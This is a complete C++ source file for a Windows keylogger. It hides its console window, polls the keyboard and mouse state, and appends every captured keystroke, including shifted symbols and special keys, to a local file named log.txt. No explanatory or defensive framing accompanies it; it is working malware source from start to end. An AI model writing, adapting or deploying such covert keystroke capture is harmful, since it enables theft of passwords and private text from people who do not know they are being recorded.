#include <iostream>
#include <Windows.h>
#include <Winuser.h>
#include <fstream>

int log1(int, const char *);
int log2(int, const char *);
int log3(int, const char *);


const int max = 100;

bool IsCapsLockUp;

int main() {

	FreeConsole();

	if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
		IsCapsLockUp = true;
	else
		IsCapsLockUp = false;

	int count = 0;
	while(count < max) {

		for(int key = 65; key < 91; key++) {

			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log1(key, "log.txt");
			}
		}


		for(int key = 48; key < 58; key++) {

			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log2(key, "log.txt");
			}
		}


		for(int key = 186; key < 193; key++) {

			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log2(key, "log.txt");
			}
		}


		for(int key = 219; key < 223; key++) {
	
			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log2(key, "log.txt");
			}
		}

	
		if(GetAsyncKeyState(1) == -32767) {
			count++;
			log3(1, "log.txt");
		}


		if(GetAsyncKeyState(2) == -32767) {
			count++;
			log3(2, "log.txt");
		}

		
		if(GetAsyncKeyState(4) == -32767) {
			count++;
			log3(4, "log.txt");
		}

		
		for(int key = 8; key < 10; key++) {
	
			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log3(key, "log.txt");
			}
		}

		
		if(GetAsyncKeyState(13) == -32767) {
			count++;
			log3(13, "log.txt");
		}

		if(GetAsyncKeyState(16) == -32767) {
			count++;
			log3(16, "log.txt");
		}

		// 20: CAPSLOCK
		if(GetAsyncKeyState(20) == -32767) {
			count++;
			log3(20, "log.txt");
		}

		
		if(GetAsyncKeyState(27) == -32767) {
			count++;
			log3(27, "log.txt");
		}

		for(int key = 32; key < 41; key++) {
			
			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log3(key, "log.txt");
			}
		}

	
		for(int key = 45; key < 47; key++) {
		
			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log3(key, "log.txt");
			}
		}

	
		for(int key = 91; key < 94; key++) {
		
			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log3(key, "log.txt");
			}
		}

		for(int key = 112; key < 124; key++) {
	
			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log3(key, "log.txt");
			}
		}

		
		for(int key = 162; key < 166; key++) {
			// If a key is pressed
			if(GetAsyncKeyState(key) == -32767) {
				count++;
				log3(key, "log.txt");
			}
		}
	}
	return 0;
}


int log1(int key, const char *filename) {
	
	std::ofstream out_file(filename, std::ofstream::out | std::ofstream::app);
	
	if(out_file.is_open()) {
	
		if((!GetAsyncKeyState(VK_SHIFT)) && (IsCapsLockUp == false)) {
			
			key+=32;
			out_file << char (key);
		}
		
		else if((GetAsyncKeyState(VK_SHIFT)) && (IsCapsLockUp == true)) {
			
			key+=32;
			out_file << char (key);
		}
		
		else {
	
			out_file << char (key);
		}
		out_file.close();

		return 0;
	}
	else {

		return 1;
	}
}

int log2(int key, const char *filename) {

	std::ofstream out_file(filename, std::ofstream::out | std::ofstream::app);

	if(out_file.is_open()) {
		
		if(!GetAsyncKeyState(VK_SHIFT)) {
			switch(key) {
				
				case 186: out_file << ";"; break;
				
				case 187: out_file << "="; break;
				
				case 188: out_file << ","; break;
				
				case 189: out_file << "-"; break;
				
				case 190: out_file << "."; break;
				
				case 191: out_file << "/"; break;
				
				case 192: out_file << "`"; break;
				
				case 219: out_file << "["; break;
				
				case 220: out_file << "\\"; break;
				
				case 221: out_file << "]"; break;
				
				case 222: out_file << "\'"; break;
				
				default: out_file << char (key);
			}
		}
		else {
			switch(key) {
				
				case 48: out_file << ")"; break;
			
				case 49: out_file << "!"; break;
				
				case 50: out_file << "@"; break;
				
				case 51: out_file << "#"; break;
				
				case 52: out_file << "$"; break;
				
				case 53: out_file << "%"; break;
				
				case 54: out_file << "^"; break;
				
				case 55: out_file << "&"; break;
				
				case 56: out_file << "*"; break;
			
				case 57: out_file << "("; break;
				
				case 186: out_file << ":"; break;
			
				case 187: out_file << "+"; break;
				
				case 188: out_file << "<"; break;
			
				case 189: out_file << "_"; break;
				
				case 190: out_file << ">"; break;
				
				case 191: out_file << "\?"; break;
				
				case 192: out_file << "~"; break;
				
				case 219: out_file << "{"; break;
				
				case 220: out_file << "|"; break;
				
				case 221: out_file << "}"; break;
				
				case 222: out_file << "\""; break;
			}
		}
		out_file.close();
	
		return 0;
	}
	else {
	
		return 1;
	}
}


int log3(int key, const char *filename) {

	std::ofstream out_file(filename, std::ofstream::out | std::ofstream::app);

	if(out_file.is_open()) {
		switch(key) {
			
			case VK_LBUTTON: out_file << "[LMB]"; break;
			
			case VK_RBUTTON: out_file << "[RMB]"; break;
			
			case VK_MBUTTON: out_file << "[MMB]"; break;
			
			case VK_BACK: out_file << "[BACK]"; break;
			
			case VK_TAB: out_file << "[TAB]"; break;
			
			case VK_RETURN: out_file << "[ENTER]\n"; break;
			
			case VK_SHIFT: out_file << "[SHIFT]"; break;
			
			case VK_CAPITAL:
				if(IsCapsLockUp == true) {
					// C0 = CAPSLOCK Down
					out_file << "[CAP0]";
					IsCapsLockUp = false;
				}
				else {
					// C1 = CAPSLOCK Up
					out_file << "[CAP1]";
					IsCapsLockUp = true;
				}
				break;
			
			case VK_ESCAPE: out_file << "[ESC]"; break;
			
			case VK_SPACE: out_file << "[SPACE] "; break;
			
			case VK_PRIOR: out_file << "[PGUP]"; break;
			
			case VK_NEXT: out_file << "[PGDN]"; break;
			
			case VK_END: out_file << "[END]"; break;
			
			case VK_HOME: out_file << "[HOME]"; break;
			
			case VK_LEFT: out_file << "[ARROWL]"; break;
			
			case VK_UP: out_file << "[ARROWU]"; break;
			
			case VK_RIGHT: out_file << "[ARROWR]"; break;
			
			case VK_DOWN: out_file << "[ARROWD]"; break;
			
			case VK_INSERT: out_file << "[INS]"; break;
			
			case VK_DELETE: out_file << "[DEL]"; break;
			
			case VK_LWIN: out_file << "[LWIN]"; break;
			
			case VK_RWIN: out_file << "[RWIN]"; break;
			
			case VK_APPS: out_file << "[MENU]"; break;
	
			case VK_F1: out_file << "[F1]"; break;
			case VK_F2: out_file << "[F2]"; break;
			case VK_F3: out_file << "[F3]"; break;
			case VK_F4: out_file << "[F4]"; break;
			case VK_F5: out_file << "[F5]"; break;
			case VK_F6: out_file << "[F6]"; break;
			case VK_F7: out_file << "[F7]"; break;
			case VK_F8: out_file << "[F8]"; break;
			case VK_F9: out_file << "[F9]"; break;
			case VK_F10: out_file << "[F10]"; break;
			case VK_F11: out_file << "[F11]"; break;
			case VK_F12: out_file << "[F12]"; break;
			
			case VK_LCONTROL: out_file << "[LCTRL]"; break;
			
			case VK_RCONTROL: out_file << "[RCTRL]"; break;
			
			case VK_LMENU: out_file << "[LALT]"; break;
		
			case VK_RMENU: out_file << "[RALT]"; break; 
		}
		out_file.close();
		
		return 0;
	}
	else {
		
		return 1;
	}
}
